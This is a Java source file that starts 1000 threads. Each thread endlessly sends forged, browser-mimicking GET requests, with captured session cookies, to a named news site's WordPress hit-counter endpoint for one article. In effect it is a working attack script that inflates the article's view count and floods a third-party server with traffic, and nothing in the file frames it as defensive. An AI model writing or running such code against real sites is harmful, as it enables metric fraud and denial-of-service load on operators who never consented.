import com.mashape.unirest.http.HttpResponse;
import com.mashape.unirest.http.Unirest;
import com.mashape.unirest.http.exceptions.UnirestException;

public class HeyBabe implements Runnable {

    public static void main(String[] args) throws Exception {
        extracted();
    }

    private static void extracted() {
        for (int i = 0; i < 1000; i++) {
            final HeyBabe heyBabe = new HeyBabe();
            final Thread thread = new Thread(heyBabe);

            thread.start();
        }
    }

    public static void hey() {
        double v = Math.random() * 49 + 1;
        Unirest.setTimeouts(0, 0);
        HttpResponse<String> response = null;
        try {
            response = Unirest.get("https://sharij.net/wp-content/plugins/ajax-hits-counter/increment-hits/index.php?post_id=304655&t=1645905164474&r=41823")
                    .header("authority", "sharij.net")
                    .header("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"")
                    .header("cache-control", "no-cache")
                    .header("content-type", "application/json")
                    .header("sec-ch-ua-mobile", "?0")
                    .header("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36")
                    .header("sec-ch-ua-platform", "\"Linux\"")
                    .header("accept", "*/*")
                    .header("sec-fetch-site", "same-origin")
                    .header("sec-fetch-mode", "cors")
                    .header("sec-fetch-dest", "empty")
                    .header("referer", "https://sharij.net/personal-posolstva-ssha-v-ukraine-nam-govorili-chto-ukraina-eto-ne-afganistan-no-bajden-nas-brosil")
                    .header("accept-language", "uk-UA,uk;q=0.9,ru;q=0.8,en-US;q=0.7,en;q=0.6,ko;q=0.5")
                    .header("cookie", "GN_USER_ID_KEY=4b0d8b3e-a843-4146-b988-7fd6c30caecf; _gcl_au=1.1.240173500.1645904565; GN_SESSION_ID_KEY=2486eaf1-600e-41dc-8666-47040ea96010; _ga=GA1.2.487620074.1645904565; _gid=GA1.2.122775275.1645904565; _ym_uid=164590456666392364; _ym_d=1645904566; _ym_isad=1; _ym_visorc=w; _gat_gtag_UA_59302916_1=1; _gat_UA-122169255-1=1; ppwp_wp_session=26f2f0220772c5b51daa2e159f7f7a84%7C%7C1645905615%7C%7C1645905255")
                    .asString();
        } catch (Exception e) {
            hey();
        }

        System.out.println(response);
    }

    public static void loop() throws UnirestException {
        while (true) {
            hey();
            System.out.println("+");
        }
    }

    @Override
    public void run() {
        try {
            loop();
        } catch (UnirestException e) {
            e.printStackTrace();
        }
    }
}
